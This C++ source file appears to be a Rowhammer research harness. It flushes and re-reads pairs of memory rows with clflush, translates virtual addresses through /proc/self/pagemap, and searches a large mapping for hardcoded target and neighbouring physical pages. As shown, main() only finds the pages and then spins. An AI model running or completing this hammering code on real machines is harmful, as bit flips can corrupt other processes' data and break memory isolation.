#include <stdio.h>
#include <stdint.h>
#include <vector>
#include <assert.h>
#include <inttypes.h>
#include <sys/mman.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <math.h>
#include <iostream>
#include <fstream>
#include <cstdio>
#include <sys/sysinfo.h>
#include <utility> 
#include <sys/personality.h>


#include <sched.h>
#include <inttypes.h>
#include <time.h>


#define NUMBER_PAGES 2
#define PAGE_SIZE 4096
#define TOGGLES 3000000
#define HAMMER_ITERATIONS 1
#define NUM_PATTERNS 4
#define TEST_ITERATIONS 10
#define MAX_POSITION 9

using namespace std;

int STACK_SIZE = 0;

size_t mem_size;
char *memory;
double fraction_of_physical_memory = 0.1;

bool hammer = true;


enum Pattern { zero_zero_zero, zero_zero_one, one_zero_zero, one_zero_one };

struct PageCandidate {
    uint32_t pageNumber;
    uint32_t abovePage;
    uint32_t belowPage;

    uint8_t* pageVA;
    uint8_t* aboveVA[2];
    uint8_t* belowVA[2];
};


uint64_t getPage(uint8_t* virtual_address) {
    int pagemap = open("/proc/self/pagemap", O_RDONLY);
    assert(pagemap != -1);

    uint64_t value;
    int got = pread(pagemap, &value, 8, (reinterpret_cast<uintptr_t>(virtual_address) / 0x1000) * 8);
    assert(got == 8);
    uint64_t page_frame_number = value & ((1ULL << 54) - 1);
    assert(page_frame_number != 0);
    close(pagemap);
    return page_frame_number;

}


bool pagesFilled(PageCandidate p) {
    if(p.pageVA != 0) {
        return true;
    } else {
        return false;
    }
}



uint64_t GetPhysicalMemorySize() {
    struct sysinfo info;
    sysinfo(&info);
    return (size_t) info.totalram * (size_t) info.mem_unit;
}

void setupMapping() {
    mem_size = (size_t) (((GetPhysicalMemorySize()) *
                          fraction_of_physical_memory));

    printf("MemorySize: %ld\n", mem_size);  


    memory = (char *) mmap(NULL, mem_size, PROT_READ | PROT_WRITE,
                           MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);

    assert(memory != MAP_FAILED);

    for(size_t i = 0; i < mem_size; i++) {
	    memory[i] = 77 + i;
	    //printf("%lx\n",getPage((uint8_t*)&memory[i]));
    }
}




void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations, int togs) {
    for(int i = 0; i < iterations; i++) {
        volatile uint64_t *f = (volatile uint64_t *)aboveVA;
        volatile uint64_t *s = (volatile uint64_t *)belowVA;
        unsigned long iters = togs;

        for(; iters --> 0;) {
            asm volatile("clflush (%0)" : : "r" (f) : "memory");
            *f;
            asm volatile("clflush (%0)" : : "r" (s) : "memory");
            *s;
        }
    }
}





void addVAstoPages(vector<PageCandidate> &pages) {
    printf("Checking for page VAs...\n");
    FILE *fp=fopen("PAs","w");
    uint8_t* moverVA = (uint8_t*) memory;
    while (moverVA < (((uint8_t*) memory) + mem_size)) {
        uintptr_t moverPA = getPage(moverVA);
        fprintf(fp,"%lx\n",moverPA);
	    bool match = false;
        for(int i = 0; i < pages.size(); i++) {
            PageCandidate p = pages[i];
            if(p.pageNumber == moverPA) {
                p.pageVA = moverVA;
		        match = true;
            }
            pages[i] = p;
        }



            moverVA += 0x1000;
    }
    printf("Done searching...\n\n");
}



void check(vector<PageCandidate> &pages) {
    for(int i = 0; i < NUMBER_PAGES; i++) {
        printf("Target VA%d: %p\n",i, pages[i].pageVA);
        printf("\n");
    }


    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p = pages[i];
        if(!pagesFilled(p)) {
            printf("Page not found. Exiting...\n");
            exit(1);
        }
    }
    printf("All pages found...\n");

    printf("Pages size: %i\n", pages.size());

    printf("Holding same DRAM pages\n");
    

}







int main(int argc, char *argv[]) {
    printf("Starting program...\n");
    int opt;
    /*
    while ((opt = getopt(argc, argv, "to:")) != -1) {
        switch(opt) {
            case 'o':
                STACK_SIZE = (int) strtol(optarg, NULL, 10);
		        break;
            case 't':
                hammer = false;
                printf("Starting test mode...\n\n");
                break;
        }
    }*/

    printf("Begin Checking\n");
    string fileText;
    string subString;
    string dataString;
    string needle;
    int pageCount = 0;
    uintptr_t pageValue;


    uintptr_t attackPages[NUMBER_PAGES] = { 0x191b2c, 0x191b2b};
    uintptr_t abovePages[NUMBER_PAGES] = { 0x191b0a, 0x191b0e};
    uintptr_t belowPages[NUMBER_PAGES] = { 0x191b43, 0x191b47};
   // sleep(5);

    setupMapping();
    printf("Finished setting up memory...\n");

    vector<PageCandidate> pages;
    for(int i = 0; i < NUMBER_PAGES; i++) {
        PageCandidate p;
        p.pageNumber = attackPages[i];
        p.abovePage = abovePages[i];
        p.belowPage = belowPages[i];

        p.pageVA = 0;
        pages.push_back(p);
    }

    addVAstoPages(pages);

    check(pages);
    while(1);

    return 0;
}
